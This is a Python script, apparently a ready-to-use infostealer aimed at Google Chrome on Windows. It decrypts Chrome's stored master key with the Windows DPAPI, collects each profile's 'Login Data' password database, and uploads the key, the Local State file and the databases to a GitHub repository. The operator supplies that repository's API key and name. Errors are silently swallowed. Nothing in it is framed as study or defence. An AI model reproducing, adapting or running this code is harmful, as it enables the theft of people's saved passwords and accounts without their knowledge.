from github import Github  
import json
import base64
import win32crypt
import os 



def get_secret_key(local_state):
    try:
        with open(local_state, 'r', encoding='utf-8') as f:
            local_state = json.load(f)
            encrypted_key = local_state.get('os_crypt', {}).get('encrypted_key')
            if encrypted_key:
                encrypted_key = encrypted_key.encode('utf-8')
                encrypted_key = base64.b64decode(encrypted_key)[5:]
                secret_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                secret_key = str(secret_key)
                return secret_key
            else:
                pass
    except :
        raise SystemExit
        

def github_repo(api_key,username,repo_name) : 
    github = Github(api_key).get_repo(f"{username}/{repo_name}")
    return github
    
def upload_secret_key(github,local_state) : 
    github.create_file(f'secret_key.txt','Commit message',get_secret_key(local_state),branch='main')
    
def upload_local_state(github,local_state) : 
    with open(local_state,'rb') as file : 
        local_state = file.read() 
        github.create_file(f'Local State', "Upload file", local_state, branch="main")

def upload_login_data(github,path) : 
    a = os.listdir(r'{}'.format(path))
    logindata = []
    for i in a : 
        if os.path.exists(r'{}\\{}\\Login Data'.format(path,i)) : 
            logindata.append(r'{}\\{}\\Login Data'.format(path,i))
    for i in range(0,len(logindata)) :
        with open(logindata[i],'rb') as file : 
            login_data = file.read()
            github.create_file(f"Login Data{i}", "Upload file", login_data, branch="main")


def main() : 
    try :
        local_state = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data', 'Local State')
        path = os.path.join(os.environ['USERPROFILE'], 'AppData', 'Local', 'Google', 'Chrome', 'User Data')
        api_key = ''     # PUT YOUR GITHUB ACCOUNT API KEY HERE
        username = ''    # PUT YOUR ACCOUNT USERNAME HERE
        repo_name = ''   # PUT GITHUB REPO NAME HERE
        github = github_repo(api_key,username,repo_name) 
        upload_secret_key(github,local_state)
        upload_local_state(github,local_state)
        upload_login_data(github,path)
    except : 
        pass
    
    
     


if __name__ == "__main__":
    main() 
    
